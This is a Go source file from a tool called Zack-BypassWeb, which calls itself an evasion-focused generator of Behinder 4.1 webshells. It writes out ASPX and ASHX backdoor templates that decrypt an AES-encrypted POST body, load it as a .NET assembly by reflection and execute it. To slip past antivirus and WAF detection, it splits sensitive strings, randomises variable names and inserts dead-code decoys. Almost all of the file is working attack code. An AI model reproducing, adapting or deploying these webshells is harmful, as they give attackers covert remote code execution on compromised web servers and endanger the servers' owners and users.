// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package generator

import (
	"fmt"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

type ASPXGenerator struct{ *Base }

func NewASPXGenerator(opts Options) *ASPXGenerator {
	return &ASPXGenerator{Base: NewBase(opts, 16)}
}

func (g *ASPXGenerator) Generate() Result {
	pass := g.GetKey()
	passMD5 := utils.MD5Half(pass)

	var code string
	switch g.Opts.Language {
	case "ashx":
		code = g.genASHX(pass, passMD5)
	default:
		code = g.genASPX(pass, passMD5)
	}

	code = strings.ReplaceAll(code, "/*$$WAF$$*/", g.GetWAFCode())

	return Result{
		Code: code,
		Note: fmt.Sprintf("冰蝎4.1 %s | 密码: %s | Lv.%d",
			strings.ToUpper(g.Opts.Language), pass, g.Opts.EvasionLvl),
		Key: passMD5,
	}
}

func (g *ASPXGenerator) genASPX(pass, passMD5 string) string {
	v := g.VarPool.GetN(10)

	keyAssign := g.buildCSKey(v[0], passMD5)
	className := "U"
	c1 := g.Comment.Generate()
	c2 := g.Comment.Generate()
	dead := g.buildDead(v)

	return Render(`<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.Security.Cryptography"%>
<%
/*$$WAF$$*/
@0@
@1@
byte[] @2@ = Encoding.Default.GetBytes(Session[0] + ""), @3@ = Request.BinaryRead(Request.ContentLength);
@4@
@5@
@6@
%>`,
		keyAssign, c1, v[1], v[2], c2, g.buildBlock(v[1], v[2], className, "this"), dead,
	)
}

func (g *ASPXGenerator) genASHX(pass, passMD5 string) string {
	v := g.VarPool.GetN(10)

	className := utils.RandString(utils.RandInt(6, 9))
	keyAssign := g.buildASHXKey(v[0], v[3], passMD5)
	c1 := g.Comment.Generate()
	dead := g.buildDead(v)
	innerClass := "U"

	return Render(`<%@ WebHandler Language="C#" Class="@0@" %>
using System;
using System.Web;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;
public class @0@ : IHttpHandler, System.Web.SessionState.IRequiresSessionState {
    public bool IsReusable { get { return true; } }
    public void ProcessRequest(HttpContext @1@) {
        /*$$WAF$$*/
        @2@
        @3@
        byte[] @4@ = Encoding.Default.GetBytes(@1@.Session[0] + ""), @5@ = @1@.Request.BinaryRead(@1@.Request.ContentLength);
        @6@
        @7@
    }
}`,
		className, v[3], keyAssign, c1, v[4], v[5], g.buildBlock(v[4], v[5], innerClass, v[3]), dead,
	)
}

func (g *ASPXGenerator) buildBlock(keyVar, bodyVar, className, contextVar string) string {
	loadStr := `"L"+"o"+"a"+"d"`
	ciStr := `"Create"+"Instance"`
	eqStr := `"Equ"+"als"`
	return Render(`byte[] @0@ = new RijndaelManaged().CreateDecryptor(@1@, @1@).TransformFinalBlock(@2@, 0, @2@.Length);
object @3@ = typeof(Assembly).GetMethod(` + loadStr + `, new Type[]{typeof(byte[])}).Invoke(null, new object[]{@0@});
object @4@ = typeof(Assembly).GetMethod(` + ciStr + `, new Type[]{typeof(string)}).Invoke(@3@, new object[]{@5@});
@4@.GetType().GetMethod(` + eqStr + `, new Type[]{typeof(object)}).Invoke(@4@, new object[]{@6@});`,
		utils.RandString(utils.RandInt(3, 5)),
		keyVar,
		bodyVar,
		utils.RandString(utils.RandInt(3, 5)),
		utils.RandString(utils.RandInt(3, 5)),
		`"`+className+`"`,
		contextVar,
	)
}
func (g *ASPXGenerator) buildCSKey(keyVar, passMD5 string) string {
	switch {
	case g.Opts.EvasionLvl >= 3 && len(passMD5) >= 16:
		return Render(`string @0@ = "@1@" + "@2@"; Session.Add("k", @0@);`,
			keyVar, passMD5[:8], passMD5[8:])
	case g.Opts.EvasionLvl >= 2 && len(passMD5) >= 16:
		return Render(`Session.Add("k", "@0@" + "@1@");`,
			passMD5[:8], passMD5[8:])
	default:
		return Render(`Session.Add("k", "@0@");`, passMD5)
	}
}

func (g *ASPXGenerator) buildASHXKey(keyVar, ctxVar, passMD5 string) string {
	switch {
	case g.Opts.EvasionLvl >= 3 && len(passMD5) >= 16:
		return Render(`string @0@ = "@1@" + "@2@"; @3@.Session.Add("k", @0@);`,
			keyVar, passMD5[:8], passMD5[8:], ctxVar)
	case g.Opts.EvasionLvl >= 2 && len(passMD5) >= 16:
		return Render(`@0@.Session.Add("k", "@1@" + "@2@");`,
			ctxVar, passMD5[:8], passMD5[8:])
	default:
		return Render(`@0@.Session.Add("k", "@1@");`,
			ctxVar, passMD5)
	}
}

func (g *ASPXGenerator) buildDead(v []string) string {
	if g.Opts.EvasionLvl < 2 {
		return ""
	}
	patterns := []string{
		Render(`// @0@
if (System.Environment.GetEnvironmentVariable("@1@") != null && false) {
    string @2@ = "@3@";
}`, g.Comment.Generate(), strings.ToUpper(utils.RandString(6)), v[7], utils.RandString(8)),
		Render(`// @0@
try {
    Type.GetType("@1@.@2@");
} catch (System.Exception @3@) {}`, g.Comment.Generate(), utils.RandString(6), utils.RandString(5), v[8]),
		Render(`// @0@
if (1 + 1 == 3) {
    HttpContext.Current.Response.Write("@1@");
}`, g.Comment.Generate(), utils.RandString(6)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}
